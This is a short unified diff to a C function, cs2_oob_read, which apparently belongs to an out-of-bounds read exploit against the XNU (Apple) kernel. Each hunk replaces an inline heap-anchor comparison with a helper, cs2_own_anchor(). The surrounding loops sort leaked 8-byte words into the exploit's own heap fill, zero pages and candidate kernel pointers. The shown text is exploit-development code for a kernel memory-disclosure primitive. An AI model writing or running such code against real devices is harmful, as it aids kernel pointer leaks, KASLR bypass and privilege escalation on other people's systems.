@@ -162,7 +162,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                 /* anchor-tag law: the REAL same-boot heap anchor is OUR OWN
                    fill. Skip before any shape count — an anchor-tagged
                    window is never a KERNEL POINTER claim. */
-                if (cs2_ctx.heap_anchor_armed && q == cs2_ctx.heap_anchor) { anchor_n++; continue; }
+                if (cs2_own_anchor(q)) { anchor_n++; continue; }
                 if (q == 0) { zerofill_n++; continue; }  /* v2: the 0x7000 zero-hole page is NOT kernel content */
                 unmarked++;
                 if (!first_foreign) first_foreign = q;
@@ -244,7 +244,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                 uint64_t wq = 0;
                                 memcpy(&wq, buffer + wqi * 8, sizeof(wq));
                                 if (wq == cs2_ctx.random_marker) continue;
-                                if (cs2_ctx.heap_anchor_armed && wq == cs2_ctx.heap_anchor) continue;   /* own fill, not a kptr claim */
+                                if (cs2_own_anchor(wq)) continue;   /* own fill (any anchor), not a kptr claim */
                                 if (wq == 0) { wz++; continue; }
                                 wu++;
                                 if (!wf) wf = wq;
@@ -302,7 +302,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                 uint64_t hq = 0;
                                 memcpy(&hq, buffer + hqi * 8, sizeof(hq));
                                 if (hq == cs2_ctx.random_marker) continue;
-                                if (cs2_ctx.heap_anchor_armed && hq == cs2_ctx.heap_anchor) continue;   /* own fill, not a kptr claim */
+                                if (cs2_own_anchor(hq)) continue;   /* own fill (any anchor), not a kptr claim */
                                 if (hq == 0) { hz++; continue; }
                                 hu++;
                                 if (!hf) hf = hq;
